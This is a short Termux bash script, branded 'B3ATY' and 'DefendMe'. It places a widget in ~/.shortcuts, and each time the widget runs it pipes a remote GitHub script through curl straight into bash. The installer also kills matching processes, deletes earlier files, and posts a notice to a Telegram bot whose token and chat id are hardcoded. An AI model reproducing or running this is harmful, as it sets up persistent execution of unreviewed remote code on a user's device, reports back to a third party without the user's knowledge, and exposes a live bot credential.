#!/data/data/com.termux/files/usr/bin/bash
# B3ATY-😎🔥 | Powered by Aiman Mohammed | Telegram Notifications Enabled

# Check environment
[ ! -d "$HOME/.shortcuts" ] && mkdir -p "$HOME/.shortcuts"
chmod -R 700 "$HOME/.shortcuts"

# Kill previous conflicts
pkill -f b3aty.sh >/dev/null 2>&1
rm -f "$HOME/.shortcuts/b3aty.sh"

# Cleanup old widget
rm -f "$HOME/.shortcuts/B3ATY-😎🔥"

# Create new widget
cat <<EOF > "$HOME/.shortcuts/B3ATY-😎🔥"
#!/data/data/com.termux/files/usr/bin/bash
curl -s https://raw.githubusercontent.com/Papa-yoga/DefendMe/main/DefendMe.sh | bash
EOF

chmod +x "$HOME/.shortcuts/B3ATY-😎🔥"

# Telegram feedback
curl -s -X POST https://api.telegram.org/bot8158605165:AAGpJnXr5fsPDomiVSu69KgPKxkfQBpRWbs/sendMessage \
 -d chat_id=7296275500 \
 -d text="[B3ATY 🔥] DefendMe.sh executed and widget refreshed."

# Signature
echo "[✓] Script signed by: AIMAN-Mohammed | Powered for: @papa_yoga"